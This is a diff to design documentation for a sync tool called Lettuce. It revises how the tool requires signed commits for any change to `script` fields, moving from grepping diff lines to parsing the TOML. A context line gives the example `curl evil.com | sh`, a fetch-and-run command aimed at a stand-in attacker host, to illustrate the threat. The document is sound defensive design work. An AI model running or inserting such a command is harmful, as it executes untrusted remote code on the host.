@@ -512,7 +512,7 @@ When a git provider sends a push webhook, Lettuce validates it with three checks
 
 Here's a subtle security requirement. An unsigned commit that changes `image = "redis:7"` to `image = "redis:8"` is probably fine. An unsigned commit that adds `script = "curl evil.com | sh"` is definitely not.
 
-Lettuce auto-enforces commit signing for any commit that adds or modifies a `script` field, regardless of the global `require_signed_commits` setting. The check happens by diffing the commit against its parent and searching for added lines containing "script".
+Lettuce auto-enforces commit signing for any commit that adds, changes or removes a `script` value, regardless of the global `require_signed_commits` setting. The first version diffed the commit against its parent and grepped the added lines for "script". That missed an edit inside a multi-line script body (no changed line mentions `script`), a deletion, and a `git diff` that failed with empty output. So now Lettuce parses the TOML instead: `script_values` in `src/lettuce/verify.rs` collects every `script` value, at any depth, from the last applied tree and from the new one, and any difference needs a signature from a trusted key. If the previous tree can't be read or parsed, the commit counts as changing scripts. On the first sync there's no previous tree, so any script at all needs a signature.
 
 ### Back-off on failure
 
